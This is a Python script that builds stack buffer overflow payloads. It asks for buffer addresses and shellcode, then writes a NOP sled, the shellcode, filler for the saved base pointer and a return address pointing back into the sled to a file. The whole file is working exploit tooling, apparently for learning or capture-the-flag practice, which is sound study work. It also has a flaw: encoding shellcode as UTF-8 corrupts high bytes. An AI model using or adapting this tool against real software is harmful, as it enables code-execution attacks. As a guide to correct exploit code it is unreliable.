import struct


def generatePayload(bufferStart,nops,shellcode,basePointer,jumpAddr):
    payload = b""
    pos = bufferStart
    print("[+] Generating payload")
    print(" +"+"-"*80+"+")
    disp = " |   0x{:10x}   |   {:2}   | 0x{:10x}   ||  {:30}  | "

    payload += b'\x90'*nops
    print(disp.format(pos,nops,pos+nops,"Adding NOPs"))
    pos += nops

    payload += shellcode.encode('utf-8')
    print(disp.format(pos,len(shellcode),pos+len(shellcode),"Added Shellcode"))
    pos += len(shellcode)

    payload += b"ABCD"
    print(disp.format(pos,4,pos+4,"Overwriting BasePointer"))
    pos += 4

    payload += struct.pack("I",jumpAddr)
    print(disp.format(pos,4,pos+4,"Wrote Jump Address"))
    pos +=4
    print(" +"+"-"*80+"+")
    print("[+] Generated Payload | Size {} bytes".format(len(payload)))
    return payload


def getShellCodeFromUser():
    shellcode_str = input("[+] Enter shellcode : ")
    shellcode = ""
    for char in shellcode_str.split('\\x')[1:]:
        shellcode += chr(int(char,16))
    print("[+] Shellcode of size {} bytes".format(len(shellcode)))
    return shellcode,len(shellcode)


def getPointersFromUser():
    print("[+] Printing String to help with buffer exploration :")
    string = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
    print("[+] {}".format(string))

    bufferStart = input("[+] Start of buffer (hex) : ")
    basePointerValue = input("[+] Enter BasePointer $ebp (hex) value : ")[2:]

    buffer = ''.join([4*hex(index)[2:] for index in range(65,90)])

    pos = buffer.find(basePointerValue)

    bufferStart = int(bufferStart,16)
    basePointer = bufferStart + (pos//2)

    workspace = basePointer - bufferStart
    print("[+] Workspace area (total) is of {} bytes".format(workspace))
    return bufferStart,basePointer,workspace

def getJumpAddr(bufferStart,nops):
    return bufferStart + nops//2


if __name__ == '__main__':
    bufferStart,basePointer,workspace = getPointersFromUser()
    shellcode,codelen = getShellCodeFromUser()
    
    nops = workspace - codelen
    print("[+] NOP Slide size {} bytes".format(nops))

    jumpAddr = getJumpAddr(bufferStart,nops)
    print("[+] RET addr will be overwritten to {}".format(hex(jumpAddr)))

    payload = generatePayload(bufferStart,nops,shellcode,basePointer,jumpAddr)
    open('payload','wb').write(payload)
    print("[+] Payload written to file")
